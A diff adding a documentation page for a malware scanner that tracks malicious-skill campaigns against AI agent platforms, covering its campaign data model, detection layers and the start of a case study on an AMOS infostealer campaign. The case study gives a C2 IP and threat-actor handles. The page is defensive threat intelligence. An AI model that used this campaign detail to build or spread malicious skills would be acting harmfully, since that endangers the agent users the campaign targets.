+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crawl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ClawHub Crawling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../diff-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Diff Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tui/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rich TUI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../accuracy-report/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Accuracy Report
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Features
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Features
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../plugins/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Plugin System
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ml-scoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ML Scoring
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../analytics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dashboard Analytics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../scheduled-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scheduled Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notifications/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notifications
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../audit-logging/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Audit Logging
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rbac/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RBAC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../caching/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Caching (Redis)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../postgresql/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PostgreSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Integrations
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Integrations
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../integrations/sdk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Python SDK
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../integrations/langchain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LangChain
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../integrations/github-action/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GitHub Action
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ci-integration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CI/CD Integration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../integrations/stix-taxii/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    STIX/TAXII Export
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../integrations/campaign-ingestion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Campaign Ingestion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Deployment
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Deployment
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../deployment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../deployment/docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Docker & Compose
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../deployment/kubernetes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kubernetes & Helm
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../deployment/configuration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Development
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Development
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../development/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../development/architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../development/contributing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Contributing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../development/benchmarks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Benchmarks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#campaign-data-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign Data Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#how-campaigns-work-in-malwar" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How Campaigns Work in malwar
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="How Campaigns Work in malwar">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#campaign-signature-relationship" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign-Signature Relationship
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detection-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Detection Flow
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#campaign-attribution-in-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Campaign Attribution in Results
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#api-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        API Access
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-clawhavoc-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The ClawHavoc Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The ClawHavoc Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-snyktoxic-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The SnykToxic Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The SnykToxic Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#network-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#case-study-the-shadowpkg-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Study: The ShadowPkg Campaign
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Case Study: The ShadowPkg Campaign">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#background_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#threat-actor-profile_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Threat Actor Profile
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#known-threat-actors_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known Threat Actors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-chain_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#indicators-of-compromise-iocs_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise (IOCs)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Indicators of Compromise (IOCs)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#package-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Package IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#infrastructure-iocs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Infrastructure IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#publisher-iocs_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Publisher IOCs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malwar-detection-coverage_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        malwar Detection Coverage
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#seed-data_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Seed Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adding-new-campaigns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Adding New Campaigns
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Adding New Campaigns">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-define-the-campaign" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Define the Campaign
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-create-threat-signatures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Create Threat Signatures
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-add-known-publishers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Add Known Publishers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-add-hardcoded-detection-rules-optional" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Add Hardcoded Detection Rules (Optional)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-verify-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Verify Detection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#best-practices-for-campaign-tracking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Best Practices for Campaign Tracking
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<!-- Copyright (c) 2026 Veritas Aequitas Holdings LLC. All rights reserved. -->
+
+<h1 id="threat-campaigns">Threat Campaigns<a class="headerlink" href="#threat-campaigns" title="Permanent link">&para;</a></h1>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>Malwar tracks coordinated malware campaigns that target the agentic skill ecosystem. A campaign represents an organized effort by threat actors to distribute malicious skills through platforms like ClawHub. Campaign tracking enables attribution, IOC sharing, and proactive detection of new variants.</p>
+<h2 id="campaign-data-model">Campaign Data Model<a class="headerlink" href="#campaign-data-model" title="Permanent link">&para;</a></h2>
+<p>Each campaign is stored in the <code>campaigns</code> database table with the following fields:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>id</code></td>
+<td>string</td>
+<td>Unique campaign identifier (e.g., <code>campaign-clawhavoc-001</code>)</td>
+</tr>
+<tr>
+<td><code>name</code></td>
+<td>string</td>
+<td>Human-readable campaign name</td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>string</td>
+<td>Detailed description of the campaign's tactics, techniques, and procedures</td>
+</tr>
+<tr>
+<td><code>first_seen</code></td>
+<td>datetime</td>
+<td>Date the campaign was first observed</td>
+</tr>
+<tr>
+<td><code>last_seen</code></td>
+<td>datetime</td>
+<td>Date of the most recent observed activity</td>
+</tr>
+<tr>
+<td><code>attributed_to</code></td>
+<td>string</td>
+<td>Known threat actor handles or groups</td>
+</tr>
+<tr>
+<td><code>iocs</code></td>
+<td>string[]</td>
+<td>List of Indicators of Compromise (IPs, domains, URLs, hashes, usernames)</td>
+</tr>
+<tr>
+<td><code>total_skills_affected</code></td>
+<td>integer</td>
+<td>Number of skills confirmed to be part of this campaign</td>
+</tr>
+<tr>
+<td><code>status</code></td>
+<td>string</td>
+<td>Campaign status: <code>active</code>, <code>inactive</code>, or <code>monitoring</code></td>
+</tr>
+<tr>
+<td><code>signature_ids</code></td>
+<td>string[]</td>
+<td>IDs of threat signatures linked to this campaign</td>
+</tr>
+</tbody>
+</table>
+<h2 id="how-campaigns-work-in-malwar">How Campaigns Work in malwar<a class="headerlink" href="#how-campaigns-work-in-malwar" title="Permanent link">&para;</a></h2>
+<h3 id="campaign-signature-relationship">Campaign-Signature Relationship<a class="headerlink" href="#campaign-signature-relationship" title="Permanent link">&para;</a></h3>
+<p>Campaigns are linked to threat signatures through the <code>campaign_id</code> field on the <code>signatures</code> table. When a signature matches during Layer 4 (Threat Intelligence) detection, the associated campaign is recorded in the scan context.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Campaign
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>  |
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  +-- has many -&gt; Signatures
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>  |     |
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  |     +-- pattern_type: exact | regex
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>  |     +-- pattern_value: &quot;91.92.242.30&quot;
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>  |     +-- ioc_type: ip | domain | url | hash | email
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>  |
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>  +-- has many -&gt; IOCs (stored as JSON array)
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>  +-- attributed_to -&gt; Threat actor handles
+</code></pre></div>
+<h3 id="detection-flow">Detection Flow<a class="headerlink" href="#detection-flow" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p><strong>Layer 1 (Rule Engine):</strong> The <code>MALWAR-MAL-001</code> rule performs hardcoded IOC matching for known campaigns (e.g., ClawHavoc C2 IPs, domains, repos, authors).</p>
+</li>
+<li>
+<p><strong>Layer 2 (URL Crawler):</strong> Domain reputation checks identify URLs pointing to known-malicious infrastructure. The reputation database includes campaign-specific domains.</p>
+</li>
+<li>
+<p><strong>Layer 3 (LLM Analyzer):</strong> Semantic analysis may identify campaign-specific patterns (e.g., the AMOS infostealer's characteristic prerequisite-download-execute flow).</p>
+</li>
+<li>
+<p><strong>Layer 4 (Threat Intelligence):</strong> The <code>ThreatIntelMatcher</code> correlates all IOCs from prior layers against the signature database. When a signature matches, its <code>campaign_id</code> is used to attribute the finding to a specific campaign.</p>
+</li>
+</ol>
+<h3 id="campaign-attribution-in-results">Campaign Attribution in Results<a class="headerlink" href="#campaign-attribution-in-results" title="Permanent link">&para;</a></h3>
+<p>When a scan matches one or more campaigns, the campaign names are recorded in:</p>
+<ul>
+<li><code>ScanContext.matched_campaigns</code> -- Available to subsequent detection layers</li>
+<li><code>Finding.metadata.campaign</code> -- On each threat-intel finding</li>
+<li><code>Finding.metadata.signature_id</code> -- The specific signature that matched</li>
+</ul>
+<h3 id="api-access">API Access<a class="headerlink" href="#api-access" title="Permanent link">&para;</a></h3>
+<p>Campaigns can be queried via the REST API:</p>
+<ul>
+<li><code>GET /api/v1/campaigns</code> -- List all active campaigns</li>
+<li><code>GET /api/v1/campaigns/{campaign_id}</code> -- Get campaign details with signature count</li>
+</ul>
+<hr />
+<h2 id="case-study-the-clawhavoc-campaign">Case Study: The ClawHavoc Campaign<a class="headerlink" href="#case-study-the-clawhavoc-campaign" title="Permanent link">&para;</a></h2>
+<h3 id="background">Background<a class="headerlink" href="#background" title="Permanent link">&para;</a></h3>
+<p>ClawHavoc is the largest known malware campaign targeting the agentic skill ecosystem. First observed in January 2026, it has compromised 824+ skills on ClawHub, representing a significant portion of the platform's malicious content.</p>
+<h3 id="threat-actor-profile">Threat Actor Profile<a class="headerlink" href="#threat-actor-profile" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Campaign Name</strong></td>
+<td>ClawHavoc</td>
+</tr>
+<tr>
+<td><strong>First Seen</strong></td>
+<td>2026-01-15</td>
+</tr>
+<tr>
+<td><strong>Last Seen</strong></td>
+<td>2026-02-10</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>Active</td>
+</tr>
+<tr>
+<td><strong>Malware Payload</strong></td>
+<td>AMOS (Atomic macOS Stealer) infostealer</td>
+</tr>
+<tr>
+<td><strong>Primary Target</strong></td>
+<td>macOS users of AI agent tools</td>
+</tr>
+<tr>
+<td><strong>Affected Skills</strong></td>
+<td>824+ confirmed</td>
+</tr>
+</tbody>
+</table>
+<h3 id="known-threat-actors">Known Threat Actors<a class="headerlink" href="#known-threat-actors" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>zaycv</td>
+<td>Primary operator, most prolific publisher</td>
+</tr>
+<tr>
+<td>Ddoy233</td>
+<td>GitHub repository operator, hosted trojanized OpenClaw CLI</td>
+</tr>
+<tr>
+<td>hightower6eu</td>
+<td>Secondary operator</td>
+</tr>
+<tr>
+<td>clawdhub1</td>
+<td>Publisher account for mass skill uploads</td>
+</tr>
+<tr>
+<td>Aslaep123</td>
+<td>Publisher account</td>
+</tr>
+<tr>
+<td>moonshine-100rze</td>
+<td>Publisher account</td>
+</tr>
+<tr>
+<td>pepe276</td>
+<td>Publisher account</td>
+</tr>
+<tr>
+<td>hedefbari</td>
+<td>Publisher account</td>
+</tr>
+</tbody>
+</table>
